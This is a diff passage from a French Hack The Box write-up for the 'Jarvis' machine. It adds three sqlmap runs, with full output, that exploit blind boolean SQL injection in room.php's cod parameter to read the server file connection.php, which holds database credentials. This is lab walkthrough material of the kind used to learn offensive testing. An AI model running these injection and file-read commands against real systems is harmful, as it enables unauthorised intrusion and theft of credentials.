@@ -923,6 +923,203 @@ L’application étant développée en PHP et connectée à MySQL, ses fichiers 
 
 La prochaine étape consiste donc à tenter de récupérer le fichier `connection.php`.
 
+premier run après le delete de share/sqlmap/jarvis
+
+```bash
+──(kali㉿kali)-[/mnt/kvm-md0/HTB/jarvis]
+└─$ sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --string='Suite room is perfect' \
+  --threads=1 \
+  --delay=1 \
+  --skip-waf \
+  --disable-precon \
+  --batch \
+  --no-cast \
+  --file-read=/var/www/html/connection.php
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.6#stable}
+|_ -| . [)]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:25:03 /2026-07-15/
+
+[18:25:04] [INFO] testing connection to the target URL
+[18:25:05] [INFO] testing if the provided string is within the target URL page content
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=h9mrinfrbv5...1ok27e2j31'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=2 AND 8493=8493
+---
+[18:25:05] [INFO] testing MySQL
+[18:25:05] [WARNING] the back-end DBMS is not MySQL
+[18:25:05] [CRITICAL] sqlmap was not able to fingerprint the back-end database management system
+
+[*] ending @ 18:25:05 /2026-07-15/
+
+                                                                                     
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/jarvis]
+└─$ rm -rf ~/.local/share/sqlmap/output/jarvis.htb
+                                                                                     
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/jarvis]
+└─$ sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --threads=1 \
+  --delay=1 \
+  --timeout=20 \
+  --retries=5 \
+  --disable-precon \
+  --batch \
+  --file-read=/var/www/html/connection.php
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.10.6#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [.]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:28:18 /2026-07-15/
+
+[18:28:18] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=ncvmhogrutg...gms325q4s6'). Do you want to use those [Y/n] Y
+[18:28:19] [INFO] checking if the target is protected by some kind of WAF/IPS
+[18:28:20] [INFO] testing if the target URL content is stable
+[18:28:21] [INFO] target URL content is stable
+[18:28:22] [WARNING] heuristic (basic) test shows that GET parameter 'cod' might not be injectable
+[18:28:23] [INFO] testing for SQL injection on GET parameter 'cod'
+[18:28:23] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[18:28:28] [INFO] GET parameter 'cod' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="Suite room is perfect")
+[18:28:28] [INFO] checking if the injection point on GET parameter 'cod' is a false positive
+GET parameter 'cod' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection point(s) with a total of 13 HTTP(s) requests:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=2 AND 1163=1163
+---
+[18:28:36] [INFO] testing MySQL
+[18:28:37] [INFO] confirming MySQL
+[18:28:41] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25, PHP
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[18:28:42] [INFO] fingerprinting the back-end DBMS operating system
+[18:28:43] [INFO] the back-end DBMS operating system is Linux
+[18:28:43] [INFO] fetching file: '/var/www/html/connection.php'
+[18:28:43] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[18:28:43] [INFO] retrieved: 3C3F7068700A24636F6E6E656374696F6E3D6E6577206D7973716C692827313
+[18:34:06] [WARNING] unexpected HTTP code '404' detected. Will use (extra) validation step in similar cases
+
+[18:34:09] [WARNING] there was a problem decoding value '3C3F7068700A24636F6E6E656374696F6E3D6E6577206D7973716C692827313' from expected hexadecimal form
+do you want confirmation that the remote file '/var/www/html/connection.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
+[18:34:09] [INFO] retrieved: 
+[18:34:13] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[18:34:13] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
+files saved to [1]:
+[*] /home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php (size differs from remote file)
+
+[18:34:13] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 8 times
+[18:34:13] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
+
+[*] ending @ 18:34:13 /2026-07-15/
+
+ 
+```
+
+deuxième lancement
+
+```bash
+                                                                                     
+┌──(kali㉿kali)-[/mnt/kvm-md0/HTB/jarvis]
+└─$ sqlmap \
+  -u 'http://jarvis.htb/room.php?cod=2' \
+  -p cod \
+  --dbms=MySQL \
+  --technique=B \
+  --threads=1 \
+  --delay=1 \
+  --timeout=20 \
+  --retries=5 \
+  --disable-precon \
+  --batch \
+  --file-read=/var/www/html/connection.php
+        ___
+       __H__
+ ___ ___["]_____ ___ ___  {1.10.6#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [']_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 18:37:36 /2026-07-15/
+
+[18:37:36] [INFO] testing connection to the target URL
+you have not declared cookie(s), while server wants to set its own ('PHPSESSID=06jin9jegg1...rjqermf8s3'). Do you want to use those [Y/n] Y
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: cod (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: cod=2 AND 1163=1163
+---
+[18:37:37] [INFO] testing MySQL
+[18:37:37] [INFO] confirming MySQL
+[18:37:37] [INFO] the back-end DBMS is MySQL
+web server operating system: Linux Debian 9 (stretch)
+web application technology: PHP, Apache 2.4.25
+back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
+[18:37:37] [INFO] fingerprinting the back-end DBMS operating system
+[18:37:37] [INFO] the back-end DBMS operating system is Linux
+[18:37:37] [INFO] fetching file: '/var/www/html/connection.php'
+[18:37:37] [INFO] resumed: 3C3F7068700A24636F6E6E656374696F6E3D6E6577206D7973716C692827313
+[18:37:37] [WARNING] there was a problem decoding value '3C3F7068700A24636F6E6E656374696F6E3D6E6577206D7973716C692827313' from expected hexadecimal form
+do you want confirmation that the remote file '/var/www/html/connection.php' has been successfully downloaded from the back-end DBMS file system? [Y/n] Y
+[18:37:37] [WARNING] running in a single-thread mode. Please consider usage of option '--threads' for faster data retrieval
+[18:37:37] [INFO] retrieved: 
+[18:37:38] [WARNING] unexpected HTTP code '404' detected. Will use (extra) validation step in similar cases
+
+[18:37:41] [WARNING] in case of continuous data retrieval problems you are advised to try a switch '--no-cast' or switch '--hex'
+[18:37:41] [WARNING] it looks like the file has not been written (usually occurs if the DBMS process user has no write privileges in the destination path)
+files saved to [1]:
+[*] /home/kali/.local/share/sqlmap/output/jarvis.htb/files/_var_www_html_connection.php (size differs from remote file)
+
+[18:37:41] [WARNING] HTTP error codes detected during run:
+404 (Not Found) - 4 times
+[18:37:41] [INFO] fetched data logged to text files under '/home/kali/.local/share/sqlmap/output/jarvis.htb'
+
+[*] ending @ 18:37:41 /2026-07-15/
+
+ 
+```
+
+
+
+
+
+
+
+
+
+
+
 ```bash
 sqlmap \
   -u 'http://jarvis.htb/room.php?cod=2' \
